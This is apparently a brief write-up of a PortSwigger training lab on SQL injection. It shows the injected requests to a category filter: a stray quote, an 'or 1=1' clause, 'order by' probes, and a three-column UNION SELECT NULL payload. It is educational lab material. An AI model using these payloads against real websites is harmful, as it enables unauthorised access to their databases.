#Lab: SQL injection UNION attack, determining the number of columns returned by the query

#https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

```bash
GET /filter?category=Lifestyle'
```
```bash
GET /filter?category=Lifestyle'or 1=1--
```
```bash
GET /filter?category=Lifestyle'order by 3--

GET /filter?category=Lifestyle'order by 4--
```
```bash
Lifestyle' UNION SELECT NULL,NULL,NULL--
```
#Lab Completed
